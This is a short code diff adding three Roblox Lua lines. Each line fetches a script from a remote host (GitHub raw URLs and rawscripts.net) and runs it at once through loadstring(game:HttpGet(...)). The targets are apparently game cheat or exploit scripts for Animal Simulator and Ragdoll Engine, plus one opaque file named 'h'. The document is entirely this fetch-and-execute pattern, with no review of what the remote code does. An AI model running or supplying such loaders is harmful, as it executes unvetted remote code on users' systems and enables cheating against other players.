@@ -1,0 +1,3 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AWdadwdwad2/net/refs/heads/main/h"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/CrowzScripts/AnimalSim/refs/heads/main/WolfScript"))()
+loadstring(game:HttpGet("https://rawscripts.net/raw/Ragdoll-Engine-BEST-SCRIPT-WORKING-SystemBroken-7544"))()
